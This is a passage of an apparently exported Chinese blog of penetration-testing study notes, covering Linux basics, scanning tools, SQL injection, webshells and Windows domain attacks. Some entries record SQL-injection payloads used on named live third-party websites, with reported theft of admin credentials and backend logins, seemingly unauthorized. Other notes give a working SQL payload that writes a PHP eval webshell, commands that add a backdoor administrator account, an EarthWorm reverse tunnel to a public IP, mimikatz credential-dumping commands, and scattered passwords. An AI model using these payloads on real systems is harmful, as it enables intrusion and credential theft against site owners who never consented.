class="line">miredo:x:112:65534::&#x2F;var&#x2F;run&#x2F;miredo:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_rpc:x:113:65534::&#x2F;run&#x2F;rpcbind:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:114:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:115:120::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:116:121:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:117:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">statd:x:118:65534::&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">postgres:x:119:123:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash</span><br><span class="line">avahi:x:120:125:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">stunnel4:x:121:126::&#x2F;var&#x2F;run&#x2F;stunnel4:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-snmp:x:122:127::&#x2F;var&#x2F;lib&#x2F;snmp:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614090034157.png" alt=""></p>
<ul>
<li><p>用户划分 </p>
<ul>
<li>系统用户<ul>
<li>root</li>
</ul>
</li>
<li>普通用户<ul>
<li>用户所创建的用户</li>
</ul>
</li>
<li>虚拟用户<ul>
<li>软件所创建的虚拟用户</li>
</ul>
</li>
</ul>
</li>
<li><p>用户组信息：cat /etc/group</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">scanner:x:133:saned,kali</span><br><span class="line">saned:x:134:</span><br><span class="line">sambashare:x:135:</span><br><span class="line">inetsim:x:136:</span><br><span class="line">colord:x:137:</span><br><span class="line">geoclue:x:138:</span><br><span class="line">lightdm:x:139:</span><br><span class="line">kpadmins:x:140:</span><br><span class="line">kali:x:1000:</span><br><span class="line">kaboxer:x:141:kali,root</span><br><span class="line">systemd-coredump:x:999:</span><br><span class="line">beef-xss:x:142:</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614091754143.png" alt="image-20210614091754143"></p>
<ul>
<li><strong>id组名</strong> 查看组信息</li>
</ul>
</li>
</ul>
</blockquote>
<p>参考：<a href="https://blog.51cto.com/983836259/1634705" target="_blank" rel="noopener">https://blog.51cto.com/983836259/1634705</a></p>
<blockquote>
<ul>
<li><p>用户组</p>
<ul>
<li>文件所拥有者   ： 文件的创造者，谁创建的文件，谁就是文件的所有者</li>
<li>用户所在组      ： 当linux当前用户创建了一个文件后，则这个文件所属的组便是这个用户所在的组</li>
<li>其他组 ： 除了文件所有者以及所在组的用户外，系统其他的用户都是文件的其他组</li>
</ul>
</li>
<li><p>用户管理</p>
<ul>
<li><p>查看用户信息 ： cat /etc/passwd    </p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614093742007.png" alt="image-20210614093742007"></p>
</li>
<li><p>添加用户 </p>
<ul>
<li>useradd -m key  ——自动在home文件夹下创建key</li>
<li>useradd -g 组名 用户名 ——指定添加在某个组里面</li>
<li>passwd key ——修改key的新密码</li>
</ul>
</li>
<li><p>删除用户 userdel -r key或者不加-r  ——删除目录以及用户</p>
</li>
</ul>
</li>
<li><p>组管理</p>
<ul>
<li><p>查看用户组信息</p>
<ul>
<li><p>cat /etc/group</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614094910000.png" alt="image-20210614094910000"></p>
</li>
</ul>
</li>
<li><p>查看用户组归属  —&gt; groups用户名</p>
</li>
<li><p>添加组</p>
<ul>
<li>usermod -G 组名 用户名</li>
<li>usermod -a -G 组名 用户名 -&gt;&gt; 追加到新组</li>
</ul>
</li>
<li><p>删除组 –&gt;&gt; groupdel -f 组名</p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h1><blockquote>
<ul>
<li><p>权限划分</p>
<ul>
<li>r 表示读文件 数值为4</li>
<li>w 表示写文件 数值为2</li>
<li>x 表示执行文件 数值为1 </li>
</ul>
</li>
<li><p>查看权限 -&gt; 当前目录下 ls -l</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614095935874.png" alt="image-20210614095935874"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614100242163.png" alt="image-20210614100242163"></p>
</li>
<li><p>设置权限</p>
<ul>
<li>chmod命令<ul>
<li>chmod 777 文件名 —&gt; 给当前文件设置为777权限</li>
<li>chmod -R 777 目录名  —&gt; 给当前目录递归权限为777</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="软件安装管理"><a href="#软件安装管理" class="headerlink" title="软件安装管理"></a>软件安装管理</h1><blockquote>
<ul>
<li>dpkg —-&gt; dpkg是Debian Package缩写，是一个Debian的命令行工具，它可以用来安装、删除、构建和管理Debian的软件包<ul>
<li>安装软件 dpkg -i xxx.deb</li>
<li>卸载软件<ul>
<li>dpkg -r xxx.deb  —&gt;删除软件包</li>
<li>dpkg -r –purge xxx.deb —&gt;连通配置文件一起删除</li>
</ul>
</li>
</ul>
</li>
<li>gdebi —&gt; gdebi是一个轻量级的deb安装工具，它能代替臃肿的ubuntu软件中心安装deb<ul>
<li>安装gdebi<ul>
<li>sudo apt-get update</li>
<li>sudo apt-get install gedbi</li>
</ul>
</li>
<li>安装软件 sudo gdebi sogoupinyin.deb 选择y即可</li>
<li>图形化安装</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="压缩命令"><a href="#压缩命令" class="headerlink" title="压缩命令"></a>压缩命令</h1><blockquote>
<ul>
<li><p>linux下常用压缩文件格式</p>
<ul>
<li>.zip</li>
<li>.gz</li>
<li>.bz2</li>
<li>.tar.gz</li>
<li>.tar.bz2</li>
</ul>
</li>
<li><p>tar命令</p>
<ul>
<li><p>打包命令 ： tar -czvf 打包之后的文件名 源文件名 e.g. tar -czvf 123.tar 123.txt</p>
</li>
<li><p>解压命令： tar -xzvf 指定解包文件<img src="https://gylq.gitee.io/cloudimages/img/image-20210614125233290.png" alt="image-20210614125233290"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614130156032.png" alt="image-20210614130156032"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="搜索命令"><a href="#搜索命令" class="headerlink" title="搜索命令"></a>搜索命令</h1><blockquote>
<ul>
<li>find命令 —&gt; find命令所查找的目录路径<ul>
<li>指定目录查找并输出内容 —&gt; find ./kali/ -print</li>
<li>指定目录以shell脚本运行输出 —&gt;  find ./etc -exec ls {} ;</li>
<li>分支主题</li>
</ul>
</li>
</ul>
</blockquote>
<p>欢迎来到我的博客<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>kali基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网络攻防工具</title>
    <url>/posts/23.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h1><h2 id="1、局域网信息探测工具-gt-Softperfect-Network-Scanner"><a href="#1、局域网信息探测工具-gt-Softperfect-Network-Scanner" class="headerlink" title="1、局域网信息探测工具 - &gt; Softperfect Network Scanner"></a>1、局域网信息探测工具 - &gt; Softperfect Network Scanner</h2><blockquote>
<p><strong>支持平台： 到2008</strong></p>
</blockquote>
<h2 id="2、Whois查询方法"><a href="#2、Whois查询方法" class="headerlink" title="2、Whois查询方法"></a>2、Whois查询方法</h2><blockquote>
<p>网上查询：whois.chinaz.com</p>
<p>工具查询：whoistd（whoisThisDomain）<br>下载地址<a href="http://www.nirsoft.net/network_tools.html" target="_blank" rel="noopener">http://www.nirsoft.net/network_tools.html</a></p>
</blockquote>
<h2 id="3、网站后台扫描工具"><a href="#3、网站后台扫描工具" class="headerlink" title="3、网站后台扫描工具"></a>3、网站后台扫描工具</h2><blockquote>
<p>Wscan工具</p>
<p>御剑</p>
</blockquote>
<h2 id="4、综合扫描（X-scan）"><a href="#4、综合扫描（X-scan）" class="headerlink" title="4、综合扫描（X-scan）"></a>4、综合扫描（X-scan）</h2><blockquote>
<p>X-scan工具扫描主机存活、弱口令、SNMP等</p>
</blockquote>
<h2 id="5、综合扫描（Nessus）"><a href="#5、综合扫描（Nessus）" class="headerlink" title="5、综合扫描（Nessus）"></a>5、综合扫描（Nessus）</h2><blockquote>
<p>Nessus下载地址<a href="https://www.tenable.com/products/nessus" target="_blank" rel="noopener">https://www.tenable.com/products/nessus</a></p>
</blockquote>
<h2 id="6、手工信息收集"><a href="#6、手工信息收集" class="headerlink" title="6、手工信息收集"></a>6、手工信息收集</h2><blockquote>
<p>git导致文件泄露 访问.git/config发现未删除该文件，导致可以进行重塑网站源码 -&gt; 例如：<a href="http://192.168.15.36/zzcms8.2_1/.git/config" target="_blank" rel="noopener">http://192.168.15.36/zzcms8.2_1/.git/config</a><br>使用GitHack工具进行源码重塑</p>
</blockquote>
<h1 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h1><p>1、网站漏洞扫描</p>
<blockquote>
<p>AWVS扫描工具</p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>网络攻防工具</tag>
      </tags>
  </entry>
  <entry>
    <title>App渗透测试原理</title>
    <url>/posts/24.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<h1 id="App渗透测试和Web渗透测试基本没有区别"><a href="#App渗透测试和Web渗透测试基本没有区别" class="headerlink" title="App渗透测试和Web渗透测试基本没有区别"></a>App渗透测试和Web渗透测试基本没有区别</h1><p>App其实就是手机软件，你们不需要害怕他，问一个简单的问题，用匿名的手机去访问我们的猫舍，难道他的SQL注入就不存在了吗？</p>
<p>大部分漏洞的存在并不是在客户端而是在服务器</p>
<p>例如：SQL注入、验证码绕过、XSS、越权漏洞、支付漏洞、CSRF、变量覆盖、反序列化、文件包含、SSRF、XXE、文件上传等等</p>
<p>其实我们可以再换一个思路，渗透测试网站，其实核心是控制传参访问对吗？如果说我们不对他进行访问和传参，那么他有可能被你渗透攻击下来吗？</p>
<p>那么渗透测试的核心其实就是把控传参，其实和App交互的还是服务器，用的还是HTTP协议，交互的服务器还是同一个，网站和App和同一个服务器交互都是很正常的事情【一般都是用Api通信例如】switch.api.caohua.com/api/t</p>
<p>正常网站的交互 ：浏览器 -&gt; 网站</p>
<p>App的交互 ： App  - &gt; 网站</p>
<p> 我们既然可以抓网站的数据包，那么我们能否抓App的数据包</p>
<p>1、显示打码了，但是源码没有打码</p>
<p>很多App访问地址是写死的。写死在源码里面</p>
<p>App也是有服务端的<br>    客户端  |  服务端<br>    个人APP |  服务器</p>
<hr>
<p>实验工具：夜神模拟器</p>
<p>burp抓包设置</p>
<p><img src="https://i.loli.net/2021/05/09/iaUu4Ad2Ylvk7EB.png" alt="image-20210509163010033"></p>
<p><img src="https://i.loli.net/2021/05/09/EbMjIxhCRBWUO4g.png" alt="image-20210509163140870"></p>
<p>App木马</p>
<p>1、MSF（快速渗透测试框架攻击）</p>
<p>App：</p>
<p>​    就是套了个浏览器</p>
<p><a href="http://www.bslyun.com/" target="_blank" rel="noopener">http://www.bslyun.com/</a></p>
<hr>
<p><strong>Xposed框架APK安装</strong></p>
<p>雷电模拟器会比夜神好一点</p>
<p>App:</p>
<p>脱壳、逆向、重打包、签名</p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>注入漏洞1</title>
    <url>/posts/22.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞URL：http-www-scichi-cn-blog-viewblog-php-id-708"><a href="#漏洞URL：http-www-scichi-cn-blog-viewblog-php-id-708" class="headerlink" title="漏洞URL：http://www.scichi.cn/blog/viewblog.php?id=708"></a>漏洞URL：<a href="http://www.scichi.cn/blog/viewblog.php?id=708" target="_blank" rel="noopener">http://www.scichi.cn/blog/viewblog.php?id=708</a></h2><p><strong>第一步、对漏洞URL中id传参进行payload构造<em>联合查询注入</em></strong></p>
<p>*<em>Payload: id=-3108 UNION ALL SELECT CONCAT(0x71787a7171,0x57474269744a427a50627850784a7243656a6a6166507446495951504274755a695763614b515875,0x716a6a7171)– —-<br>*</em></p>
<p>*<em><img src="https://i.3001.net/uploads/Up_imgs/20210502-c8782850e28b73f8bc515ff4465a5c66.png!small" alt="image.png"><br>*</em></p>
<p><strong>第二步、获取数据库信息和管理员账号和密码</strong></p>
<p><strong>（1）表名证明</strong></p>
<p>*<em><img src="https://i.3001.net/uploads/Up_imgs/20210502-cb0a794af8be8a7fa5e4d44438e935d7.png!small" alt="image.png"><br>*</em></p>
<p><strong>（2）管理员账号和密码</strong></p>
<p>*<em><img src="https://i.3001.net/uploads/Up_imgs/20210502-0e5f752a5260ca4b25bf013debfffdbc.png!small" alt="image.png"><br>*</em></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入实战</title>
    <url>/posts/25.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sqlmap注入实战"><a href="#sqlmap注入实战" class="headerlink" title="sqlmap注入实战"></a>sqlmap注入实战</h1><blockquote>
<p><strong>第一个漏洞值得记录：</strong></p>
<p><strong><em>想着用谷歌语法找找最简单的sql注入试试实战</em></strong></p>
</blockquote>
<h1 id="漏洞URL：http-www-igbt-leader-com-newsinfo-php-id-55"><a href="#漏洞URL：http-www-igbt-leader-com-newsinfo-php-id-55" class="headerlink" title="漏洞URL：http://www.igbt-leader.com/newsinfo.php?id=55"></a><strong>漏洞URL：<a href="http://www.igbt-leader.com/newsinfo.php?id=55" target="_blank" rel="noopener">http://www.igbt-leader.com/newsinfo.php?id=55</a></strong></h1><h2 id="1、判断id传参处明显存在SQL注入"><a href="#1、判断id传参处明显存在SQL注入" class="headerlink" title="1、判断id传参处明显存在SQL注入"></a><strong><em>1、判断id传参处明显存在SQL注入</em></strong></h2><p><img src="https://i.loli.net/2021/05/11/IAgwdumWevQzlyn.png" alt="image-20210511194512055"></p>
<h2 id="2、构造联合查询payload进行获取数据如下"><a href="#2、构造联合查询payload进行获取数据如下" class="headerlink" title="2、构造联合查询payload进行获取数据如下"></a><strong>2、构造联合查询payload进行获取数据如下</strong></h2><h2 id="Payload-id-9845-UNION-ALL-SELECT-NULL-NULL-NULL-NULL-NULL-NULL-CONCAT-0x7178786271-0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542-0x7170706a71-–"><a href="#Payload-id-9845-UNION-ALL-SELECT-NULL-NULL-NULL-NULL-NULL-NULL-CONCAT-0x7178786271-0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542-0x7170706a71-–" class="headerlink" title="Payload: id=-9845 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786271,0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542,0x7170706a71)– -"></a>Payload: id=-9845 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178786271,0x4948654e5072676e454c6e6f4a506d72625544685871707977427444534b6b726572687741685542,0x7170706a71)– -</h2><p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210511194541891.png" alt="image-20210511194541891"></p>
<h2 id="3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密"><a href="#3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密" class="headerlink" title="3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密"></a><strong>3、SQLmap进行管理员账号和密码获取，密码进行MD5网上解密</strong></h2><p><img src="https://i.loli.net/2021/05/11/LGvc8zIhMsYEyS5.png" alt="image-20210511193811479"><br><img src="https://i.loli.net/2021/05/11/RiUIHmnszoW3x75.png" alt="image-20210511193925506"><br><img src="https://i.loli.net/2021/05/11/61YaneTsZRHvO8V.png" alt="image-20210511194002847"></p>
<h2 id="4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力"><a href="#4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力" class="headerlink" title="4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力"></a><strong>4、使用7kb制作的扫描工具快速找到后台，成功登陆后台，目前还没找到上传点，技术还得继续努力</strong></h2><p><img src="https://i.loli.net/2021/05/11/1zh6g7NZ5xp4bAa.png" alt="image-20210511194227463"></p>
<p>1、对新闻页面进行传参测试</p>
<p><img src="https://i.loli.net/2021/04/21/Bu5FpYItEDS93ZO.png" alt="image-20210421090845992"></p>
<p>2、错误传参无显示</p>
<p><img src="https://i.loli.net/2021/04/21/rFtylgILipajf7D.png" alt="image-20210421091004618"></p>
<p>3、判断可能存在SQL注入出现数据库泄露后台密码</p>
<p><img src="https://i.loli.net/2021/04/21/Sxo9FvCIhHjl1w7.png" alt="image-20210421091156279"></p>
<p><img src="https://i.loli.net/2021/04/21/jSWHt7uZYLgVcas.png" alt="image-20210421091215552"></p>
<p><img src="https://i.loli.net/2021/04/21/OacZeu8EmoKbd9k.png" alt="image-20210421091401894"></p>
<p>4、直接可以登录后台</p>
<p><img src="https://i.loli.net/2021/04/21/qA2XgDWTbP3Chd4.png" alt="image-20210421091514101"></p>
<p><a href="http://www.shbtpm.com/webinfo.php?InfoID=1&amp;LX=1" target="_blank" rel="noopener">http://www.shbtpm.com/webinfo.php?InfoID=1&amp;LX=1</a></p>
<p>URL：<a href="http://www.caep-scns.ac.cn/HPCMid_js.php?id=757" target="_blank" rel="noopener">http://www.caep-scns.ac.cn/HPCMid_js.php?id=757</a></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透</title>
    <url>/posts/65.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<p>1、重原理，轻测试</p>
<p>内网渗透的课程 </p>
<p><strong>1、主要是思路和操作为主</strong></p>
<p>靶场作为切入点</p>
<p>SQL注入可以干什么？</p>
<p><strong>获取数据、读取文件 影响数据库。</strong></p>
<p><strong>其实SQL注入是可以getshell写一句话木马</strong></p>
<p>SQL语句：导出文件：</p>
<p>​    into out file<br>​    into dumpfile</p>
<p>如果有堆叠注入 [通过日志的方法写webshell]</p>
<p><a href="http://192.168.136.129/?id=1%20unino%20select%201,%27%3C?php%20eval($_REQUEST[a])?%3E%27%20into%20dumpfile%20%27C:\\phpStudy1\\PHPTutorial\\WWW\123.txt%27" target="_blank" rel="noopener">http://192.168.136.129/?id=1%20unino%20select%201,%27%3C?php%20eval($_REQUEST[a])?%3E%27%20into%20dumpfile%20%27C:\\phpStudy1\\PHPTutorial\\WWW\123.txt%27</a></p>
<p><a href="http://192.168.136.129/?id=1.111" target="_blank" rel="noopener">http://192.168.136.129/?id=1.111</a> union select 1,0x3c3f706870206576616c28245f524551554553545b615d293f3e into dumpfile ‘C:/phpStudy1/PHPTutorial/WWW/123.php’</p>
<p>一台服务器搭建了两个网站</p>
<p>A网站是低权限运行的 webshell =&gt; 低权限  可以通过PHP往B网站写东西 写一个马</p>
<p>B网站是高权限运行的  webshell =&gt; 高权限了</p>
<hr>
<p>很多时候渗透测试人员，在做渗透测试的时候，拿到了网站权限，会发现，网站的权限调用的CMD命令，其实并不是服务器管理权限，这个时候后就需要去想办法提升自己的权限，只有自己的权限够了，才可以更好的做内网测试。</p>
<p>提权的路线其实不止一个</p>
<p><strong>不同服务组件用了不同权限。例如网站权限低，数据库权限高，那么我们就要想办法让其他组件帮我们去做事。再例如：目标及其上运行了一些其他的服务，然后这些服务只能从内部访问，然后我们也可以调用过来用。（例如：FTP|Redis等等）</strong>[这个需要一定的知识积累，早期不推荐]</p>
<p>有用的cmd命令： </p>
<blockquote>
<p>whoami <strong>查看当前用户权限</strong></p>
<p>netstat -ano <strong>查看本机开放的端口</strong></p>
<p>tasklist <strong>查看本机运行的程序[类似于任务管理器]</strong></p>
<p>systeminfo <strong>查看计算机信息</strong></p>
</blockquote>
<h2 id="利用windows的漏洞（最常见手法）"><a href="#利用windows的漏洞（最常见手法）" class="headerlink" title="利用windows的漏洞（最常见手法）"></a>利用windows的漏洞（最常见手法）</h2><p><strong>查看windows打了什么补丁，然后去网上找存在什么样的漏洞，然后找对应的提权工具</strong></p>
<p>widnows打了补丁什么漏洞我又不清楚，我怎么找？其实有前辈做了很好的东西 访问：提权辅助页面：<a href="http://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">http://bugs.hacking8.com/tiquan/</a></p>
<p>查看到补丁号填入，然后点击查询就可以，然后告诉你哪些漏洞可以用，直接去找这个微软编号的利用工具</p>
<p>net user nf 密码 /add</p>
<p>net localgroup administrators nf /add 提升管理员权限</p>
<p>3389登陆 一个公网ip内存在N多个机器</p>
<p>公网端口<br>端口转发、映射</p>
<p>内网端口 netstat -ano 看到的是内网端口</p>
<p>被攻击机器A 主动访问一台 公网B机器 是不是就可以建立连接了？</p>
<p>​    内网三台机器 </p>
<p>​    A机器、B机器、C机器</p>
<p>A机器的3389放出来  可以直接连接<br>B机器、C机器都在我手上，但是他们没有外网</p>
<p>EarthWorm</p>
<p>ew_win32.exe</p>
<p>建立反向代理 ew -s rssocks -d 103.46.128.53 -e 15906 将自己反向连接到103.46.128.53的15906端口</p>
<p>接受代理  ew -s rcsocks -l 4545 -e 80 监听80端口， 将获取的数据转发到4545端口</p>
<p>目标机器 —&gt; 路由器 -&gt; 穿透工具提供的平台 -&gt; 我</p>
<p>端口 - &gt; 不是开了就可以构成连接。 【访问到】服务</p>
<p>7 ~+I|lu}3wuA31|vvl</p>
<p>12 c373bf48.IE</p>
<p><strong>SQL注入可以干什么？</strong></p>
<p>|- 获取数据、读取文件 影响数据库。<br>|- 其实SQL注入是可以getshell  写一句话木马</p>
<p>SQL语句：导出文件</p>
<p>|- into outfile   </p>
<p>|- into dumpfile</p>
<h1 id="本地搭建phpstudy测试"><a href="#本地搭建phpstudy测试" class="headerlink" title="本地搭建phpstudy测试"></a>本地搭建phpstudy测试</h1><blockquote>
<p><strong>注意：前提是开启了dumpfile 和 Outfile  不然会报错、具体如何开启自行百度</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/kl5yqGnY8wHOrEP.png" alt="image-20210425102915152"></p>
<blockquote>
<p><strong>本地明显导入了123</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/vWSjBU98DTqXgrc.png" alt="image-20210425103040959"></p>
<blockquote>
<p>我们尝试导入一句话php测试“<?php eval($_REQUEST[a]); ?>” 注意用引号</p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/7mnTI5uSDCjfA4g.png" alt="image-20210425103359467"></p>
<p><img src="https://i.loli.net/2021/04/25/PunIqXazHMt7Y2W.png" alt="image-20210425103435470"></p>
<blockquote>
<p>导入成功，用本地测试是否有用</p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/ZruVHjmnz3Rh8kA.png" alt="image-20210425103518030"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"&lt;?php eval($_REQUEST[a]); ?&gt;"</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'C:\\phpStudy1\\PHPTutorial\\WWW\\15.php'</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>利用内网穿透、ew、proxifier，Nmap端口扫描到192.168.0.4主机已经开启，进入发现存在安全狗老版的可以绕过 </p>
</blockquote>
<p><img src="https://i.loli.net/2021/04/25/uj4cLtFd5Mv2CNR.png" alt="image-20210425104153848">‘’</p>
<p>privilege::debug token::elevate lsadump::sam 从lsass.exe进程获取 privilege::debug sekurlsa::logonpasswords</p>
<p>1q2w3e4r.</p>
<p>o%JTey4$(D0y7&lt;4RK</p>
<p>端口的转发 抓取密码</p>
<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><blockquote>
<p>很多漏洞都是为了管理员方便，都是为了偷懒而产生，所以体验感和安全永远在对立面，越方便，越危险！！！</p>
<p>内网里面有很多机器，例如：几百台，上千台电脑，但是计算机管理员仅仅只有几个人，如果他们想对所有电脑进行更新升级，是不是要累死？一台一台的操作过去，我估计得吐血</p>
<p>windows的开发也是考虑到了这个问题，所以windows中有一个域的功能。</p>
<p>域其实就是一些计算机所组成的。一歌电脑也能是一个域，一堆电脑也可以是一个域。</p>
<p>域中的机器并不平等，分为控制机和客户机，控制机的权限很大，可以操作域中任意机器，它被叫为域控制器，俗称域控（DC），拿下域控，就等于拿下所域里面所有的机器。对于黑客而言，拿下域控也是攻击的最终极目标</p>
<p>域比较复杂，分为单域、父域、子域、域树、域森林等概念 对于初期渗透测试人员而言，其实都差不多。</p>
<p>我们的目标是域控，那么我们肯定要对域有一定的了解，域作为windows的一个功能，我们为何不尝试自建一个域，来方便我们测试和学习？</p>
</blockquote>
<p>域的搭建超级简单：</p>
<p>准备两台服务器，我是虚拟机开了两台2008r2 然后进行安装</p>
<p>服务器管理器 -&gt; 添加角色 -&gt; Active Directory 域服务安装</p>
<p>选中角色运行安装向导就行 -&gt; 需要设置一个超级密码：这个地方设置尽量复杂</p>
<p>域搭建完成。</p>
<p>软件的开发，肯定要兼容性？</p>
<p>x86 32 系统  =&gt;<br>x64 64 系统 =&gt; 发现所有的x86都不能用了</p>
<p>早期版本的域  会兼容 win2003 =&gt;  windows 2008 </p>
<p>密码：shou446515184</p>
<p>域：肯定和DNS有关 zkaq.cn 我这台机器知道zkaq.cn吗？</p>
<p>1、知道【通过查询DNS服务器得知】默认情况下DNS服务器在不特殊设定的时候，自动分配沿用运营商的</p>
<p>设置DNS服务器，把使用的DNS服务器设置为内网的DNS服务器</p>
<p>DNS：192.168.4.15</p>
<p>2、不知道</p>
<p>A1B2C3!.Qa</p>
<p>sekurlsa::logonpasswords</p>
<p>打补丁 KB2871997 再修改注册列表</p>
<p>你们注册了封神台、注册了社区。</p>
<p>你们觉得通过数据库是否能看出你们的密码是什么？<br>他们会加密MD5加密已经是Low</p>
<p>密码学的核心 =&gt; 密文不可逆</p>
<p>盐值 = salt (随机数)</p>
<p>​    md5(md5($password).$salt) 不安全的加密</p>
<p>通过多次加密混淆然后形成一堆密文</p>
<p>DESKTOP-T7GJSKA</p>
<p>域控：A1B2C3!.Nf</p>
<p>客户机： A1B2C3!.Qa</p>
<p>域控的账号密码可以登录任意的域中的电脑</p>
<p>200台客户机 1台主控机【域控的账号密码】</p>
<p>Kerberos - &gt; KDC密钥分发中心 —&gt; AS 检验访问用户身份，看看你是谁，如果你的用户名存在AS对的数据库里面，那么就会给你一个随机64位的值，但是这个值是经过你的用户密码加密的，你得拿本本地自己密码解开，这个是用来通信的，你和TGS的沟通都会用这个密钥加密</p>
<p>TGS-&gt; 和目标机器进行交互，中间用AS提供的密钥加密，然后对你提供的密码进行校验</p>
<p>加密： 对称加密 【有一段密钥，谁拥有它就可以解码，加密】</p>
<p>明文传输密码是很危险的 【在中国移动，网站明文传输密码是高危漏洞】</p>
<p>AS -&gt; AS会给你一串密文 -&gt; 拿你的密码解 -&gt; 64位的随机数 -&gt; TGS的传输信息密钥</p>
<p>通信证-&gt; 票据</p>
<p>windows官方有工具可以提权【必须是administrator权限】 psexec提权</p>
<p>域控管理员会用自己的域控账号登陆客户机，那么我们就可以抓取到域控的账号和密码。但是密码并不一定抓取到的都是明文，如果是Windows server 2012以上的版本或者是打了KB2871997补丁就会抓取不到明文密码，虽然有密文，但是密文是不可逆的，基本上不可能解开</p>
<p>那该怎么利用？</p>
<p>这里就有一种方法叫做，哈希传递（PTH）pass-the-hash<br>哈希传递这是什么？</p>
<p>前几天在渗透时遇到了一个问题，SQL注入获取的MD5值解不开</p>
